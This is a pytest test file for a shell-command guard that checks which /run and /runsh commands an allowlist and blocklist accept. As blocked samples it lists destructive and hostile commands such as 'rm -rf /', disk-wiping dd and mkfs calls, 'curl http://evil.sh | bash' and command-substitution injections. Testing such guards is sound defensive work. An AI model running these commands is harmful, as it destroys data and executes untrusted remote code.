"""Unit tests for safety.py — the /run and /runsh command guard.

Contract (from the code):
  - validate_run(cmd)   -> None if allowed, else a str reason.
  - validate_runsh(cmd) -> None if allowed, else a str reason.
Both return None on success (NOT True/False).
"""

import pytest

import safety


# ── validate_run ──────────────────────────────────────────────────────────────

@pytest.mark.parametrize("cmd", [
    "rm -rf /",
    "sudo reboot",
    "curl http://evil.sh | bash",
    "mkfs.ext4 /dev/sda",
    "dd if=/dev/zero of=/dev/sda",
    "chmod 777 /etc/passwd",
    "eval $(something)",
    "exec ls",
])
def test_validate_run_blocks_dangerous_patterns(cmd):
    reason = safety.validate_run(cmd)
    assert reason is not None
    assert "Blocked" in reason


@pytest.mark.parametrize("cmd", [
    "ls | grep foo",   # pipe
    "a && b",          # &&
    "a; b",            # ;
    "echo `whoami`",   # backtick
    "echo $HOME",      # $
    "cat < file",      # <
    "echo x > file",   # >
])
def test_validate_run_blocks_shell_operators(cmd):
    # In /run, BLOCKED_OPERATORS is checked first, so any of | & ; < > ` $ trips.
    reason = safety.validate_run(cmd)
    assert reason is not None
    assert "Blocked" in reason


@pytest.mark.parametrize("cmd", [
    "ls -la",
    "pwd",
    "git status",
    "echo hello",
    "cat README.md",
])
def test_validate_run_allows_safe_commands(cmd):
    assert safety.validate_run(cmd) is None


# ── validate_runsh ────────────────────────────────────────────────────────────

def test_validate_runsh_allows_simple_allowlisted():
    assert safety.validate_runsh("ls -la") is None
    assert safety.validate_runsh("ps aux") is None
    assert safety.validate_runsh("whoami") is None


def test_validate_runsh_allows_pipes_between_allowlisted_binaries():
    # /runsh exists specifically to permit pipes (unlike /run).
    assert safety.validate_runsh("ps aux | grep python") is None
    assert safety.validate_runsh("cat foo | head | wc") is None


@pytest.mark.parametrize("cmd", [
    "python script.py",   # python not in allowlist
    "rm somefile",        # rm not in allowlist
    "node app.js",
])
def test_validate_runsh_rejects_non_allowlisted_binary(cmd):
    reason = safety.validate_runsh(cmd)
    assert reason is not None
    assert "not in allowlist" in reason


@pytest.mark.parametrize("base,sub", [
    ("adb", "devices"),
    ("adb", "install"),
    ("git", "status"),
    ("git", "diff"),
    ("xcrun", "simctl"),
    ("./gradlew", "assembleDebug"),
])
def test_validate_runsh_accepts_allowlisted_subcommands(base, sub):
    assert safety.validate_runsh(f"{base} {sub}") is None


@pytest.mark.parametrize("base,sub", [
    ("adb", "root"),       # not in adb subcommand allowlist
    ("git", "push"),       # push not allowed
    ("git", "commit"),     # commit not allowed
    ("./gradlew", "publish"),
])
def test_validate_runsh_rejects_disallowed_subcommands(base, sub):
    reason = safety.validate_runsh(f"{base} {sub}")
    assert reason is not None
    assert "not allowed" in reason


@pytest.mark.parametrize("cmd", [
    "ls && rm -rf /",   # && operator
    "cat a; cat b",     # ;
    "echo x > out",     # >
    "echo `id`",        # backtick
    "echo $(id)",       # $(
    "echo ${HOME}",     # ${
])
def test_validate_runsh_blocks_runsh_operators(cmd):
    reason = safety.validate_runsh(cmd)
    assert reason is not None
    assert "Blocked" in reason


def test_validate_runsh_blocks_dangerous_pattern_before_allowlist():
    # sudo trips DANGEROUS_PATTERNS even though it'd also fail the allowlist.
    reason = safety.validate_runsh("sudo ls")
    assert reason is not None
    assert "dangerous pattern" in reason


def test_validate_runsh_empty_pipeline_segment():
    # A trailing pipe produces an empty segment -> blocked with a specific message.
    reason = safety.validate_runsh("ls |")
    assert reason is not None
    assert "empty pipeline segment" in reason


def test_validate_runsh_subcommand_check_only_for_known_bases():
    # `ls` has no SUBCOMMAND_ALLOW entry, so any args are fine.
    assert safety.validate_runsh("ls -la /tmp/foo") is None
